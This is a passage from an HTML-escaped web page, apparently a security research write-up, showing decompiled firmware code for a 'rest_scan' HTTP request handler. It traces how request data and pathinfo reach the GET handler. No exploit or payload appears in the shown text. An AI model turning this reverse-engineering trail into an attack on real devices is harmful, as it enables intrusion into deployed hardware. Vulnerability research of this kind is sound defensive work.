class=&quot;n&quot;&gt;rest_scan_req_ifc_tbl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;httpmgr_recvData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;
              &lt;span class=&quot;n&quot;&gt;rest_scan_req_ifc_tbl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
              &lt;span class=&quot;n&quot;&gt;v2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
              &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;byte_5DBD0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
              &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v15&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v15&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_BYTE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dword_5DBC8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v15&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;_DEBUG_syslog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;REST_SCAN_DEBUG&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x475DA215&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x9C3&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2500&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;httpmgr_fptrtbl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rest_scan_req_ifc_tbl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;httpmgr_recvData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rest_scan_req_ifc_tbl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;httpmgr_fptrtbl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rest_scan_req_ifc_tbl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getHost&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;
         &lt;span class=&quot;n&quot;&gt;rest_scan_req_ifc_tbl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
         &lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
         &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
         &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;httpmgr_fptrtbl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rest_scan_req_ifc_tbl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;completeRequestHelper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;
         &lt;span class=&quot;n&quot;&gt;rest_scan_req_ifc_tbl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
         &lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2500&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;httpmgr_fptrtbl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rest_scan_req_ifc_tbl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;httpmgr_recvData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rest_scan_req_ifc_tbl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;httpmgr_fptrtbl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rest_scan_req_ifc_tbl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;completeRequestHelper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;
              &lt;span class=&quot;n&quot;&gt;rest_scan_req_ifc_tbl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
              &lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dword_65260&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dword_65260&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;dword_594F0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;switch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request_method&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rest_scan_handle_get_request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pathinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pathinfo_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// ----- [1]&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;nl&quot;&gt;default:&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If the request method is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GET&lt;/code&gt;, it will use  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rest_scan_handle_get_request&lt;/code&gt; at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[1]&lt;/code&gt; to handle it. It also passes the pathinfo to this function.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;rest_scan_handle_get_request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pathinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pathinfo_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;httpmgr_fptrtbl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r1&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r2&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;httpmgr_fptrtbl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r1&lt;/span&gt;
